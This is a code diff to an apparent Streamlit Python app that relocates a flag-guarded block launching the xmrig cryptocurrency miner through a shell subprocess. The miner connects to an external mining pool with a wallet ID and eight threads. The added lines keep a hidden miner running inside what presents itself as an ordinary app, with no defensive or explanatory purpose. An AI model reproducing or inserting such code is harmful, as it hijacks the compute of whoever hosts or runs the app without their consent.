@@ -76,7 +76,12 @@ with st.echo(code_location='below'):
 
     
 st.write(flag.controlFlag)
-st.write("tarik", flag.controlFlag)    
+st.write("tarik", flag.controlFlag)
+
+if flag.controlFlag==0:
+    flag.controlFlag+=1
+    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
+    print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")
 
 import time 
 from IPython.display import clear_output 
@@ -96,10 +101,4 @@ for x in zero_to_infinity():
     hours = temp//3600 
     temp = temp - 3600*hours 
     minutes = temp//60 
-    seconds = temp - 60*minutes 
-    
-if flag.controlFlag==0:
-    flag.controlFlag+=1
-    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
-
-    print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")    
+    seconds = temp - 60*minutes     
